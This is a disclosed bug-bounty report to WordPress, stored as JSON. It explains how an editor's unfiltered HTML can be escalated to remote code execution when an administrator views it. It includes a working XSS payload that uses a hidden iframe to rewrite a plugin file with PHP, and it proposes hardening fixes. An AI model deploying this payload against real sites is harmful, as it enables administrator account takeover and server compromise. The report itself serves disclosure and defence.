{
  "id": 263718,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjM3MTg=",
  "url": "https://hackerone.com/reports/263718",
  "title": "Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "high",
  "readable_substate": "Informative",
  "created_at": "2017-08-27T01:55:26.996Z",
  "submitted_at": "2017-08-27T01:55:26.996Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skansing",
    "url": "/skansing",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 55,
    "url": "https://hackerone.com/wordpress",
    "handle": "wordpress",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WordPress",
      "twitter_handle": "wordpress",
      "website": "https://wordpress.org/",
      "about": "Beautiful sites of any kind."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-10-04T18:53:41.370Z",
  "bug_reporter_agreed_on_going_public_at": "2017-09-06T09:01:25.027Z",
  "team_member_agreed_on_going_public_at": "2017-10-04T18:53:41.316Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#Background\nThis report is mainly about how a user with the role of editor, expectedly can post unfiltered content\nbut unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.\n\nSecondarily the report wants to highlight the technique used and the severity of it.\n\n#Description\nDuring my research I found that a XSS can, in the majority of cases, trivially be turned\ninto a RCE, by abusing same origin frame scripting in the XSS payload.\n\nI demonstrated this \"technique\" in #263058 and #263109 (no need to read, there a POC in this report).\nIt can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.\nThis adds to the severity of XSS in core wp, themes and especially plugins.\n\nIt affect the understanding of the user role 'editor' and the ability to post unfiltered content\nhttps://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html\n\nAn editor is a copy-paste and a administrator visit from RCE or performing any action.\nEditors users / accounts them self are more attractive for cracking and social engineering.\nAdministrators are not aware of the risk associated with giving a user editor role or being a editor.\nAll future reports with XSS can be escalated to RCE resulting in increased severity.\n\n\n# POC\nThis POC explores a rogue editor planting payload to RCE.\n\n- Login as editor\n- Upload a .html or plant the POC payload in content\n- Login as administrator visit a link containing the payload\n\n# POC Payload\nThe payload opens the plugin editor, edits a file and redirects to the edited file afterwards\n\n```\n<iframe src=\"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\" style=\"opacity:0\">\n</iframe>\n<script>\nsetTimeout(function() {\n  var p = \"<?php phpinfo();\"\n  // full read/write control over dom, do anything(!)\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n</script>\n```\n\n# Suggested Fix\nthe role editor should loose all privileges that can lead to scripting\n\nconsideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.\nHowever that can by bypassed by using `window.open(...)` instead of an iframe, but requires\nthe victim to click on the page after opening it. so this will only harden a bit.\n\nanother hardening option could be requiring password on critical actions such as\nplugin install, file edit, etc. it will however have an impact on accessibility and\nit might take time to find all the loop holes.\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 4,
  "voters": [
    "skansing",
    "nxqp",
    "hyper_warrior",
    "expensivepasta"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
